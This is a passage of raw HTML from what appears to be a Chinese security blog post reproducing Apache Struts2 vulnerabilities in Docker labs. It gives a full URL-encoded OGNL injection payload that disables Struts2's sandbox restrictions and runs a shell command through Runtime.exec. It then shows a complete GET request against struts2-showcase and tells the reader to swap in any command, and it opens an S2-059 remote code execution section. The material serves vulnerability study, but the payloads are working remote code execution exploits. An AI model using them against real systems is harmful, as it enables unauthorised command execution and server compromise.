style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">24</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">7B</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">20</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40ognl</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">OgnlContext</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40DEFAULT</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">_MEMBER_ACCESS</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23ct</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23request</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5B</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27struts</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">valueStack</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23cr</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23ct</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5B</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27com</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">opensymphony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">xwork2</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ActionContext</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">container</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23ou</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23cr</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40com</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">opensymphony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">xwork2</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognl</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">OgnlUtil</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23ou</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getExcludedPackageNames</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">clear</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()).(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23ou</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getExcludedClasses</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">clear</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()).(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23ct</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setMemberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23a</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Runtime</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40getRuntime</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">exec</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27id</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40org</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">apache</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">commons</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">IOUtils</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40toString</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23a</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInputStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()))%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">7D</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">bp抓包在GET处进行拼接得到id</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">GET </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">struts2</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">showcase</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">24</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">7B</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">20</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40ognl</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">OgnlContext</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40DEFAULT</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">_MEMBER_ACCESS</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23ct</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23request</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5B</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27struts</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">valueStack</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23cr</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23ct</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5B</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27com</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">opensymphony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">xwork2</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ActionContext</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">container</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23ou</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23cr</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40com</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">opensymphony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">xwork2</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognl</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">OgnlUtil</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23ou</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getExcludedPackageNames</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">clear</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()).(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23ou</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getExcludedClasses</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">clear</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()).(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23ct</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setMemberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23a</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Runtime</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40getRuntime</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">exec</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27id</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40org</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">apache</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">commons</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">IOUtils</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40toString</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23a</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInputStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()))%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">7D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">actionChain1</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">action HTTP</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1.1</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/62_2yYkBo8icHXbsyaqgUUgfrZ0brkGlQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wqLjZSdFpMXsSIbib90LDIkbwbZ2yYkBo8icHXbsyaqgUUgfrZ0brkGlQ/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在exec处修改要执行得命令即可</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/63_3qatkwGJIsHdINTo7etQej1NnxD2Rg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wkjdZ4TXR18HRR3gGgZeQPVsU3qatkwGJIsHdINTo7etQej1NnxD2Rg/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-059</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">s2-059产生的原因为攻击者可以通过构造恶意的OGNL表达式，并将其设置到可被外部输入进行修改，且会执行OGNL表达式的Struts2标签的属性值，引发OGNL表达式解析，最终造成远程代码执行的影响。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-059的docker环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4717488789237668" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/64_Jr44to6oH4KjG5W9JFBZzJaqjK2N7g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5w2kmxr6pAo6X9NzMcRlE37FTjJr44to6oH4KjG5W9JFBZzJaqjK2N7g/640?wx_fmt=png'" data-type="png" data-w="1115" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: 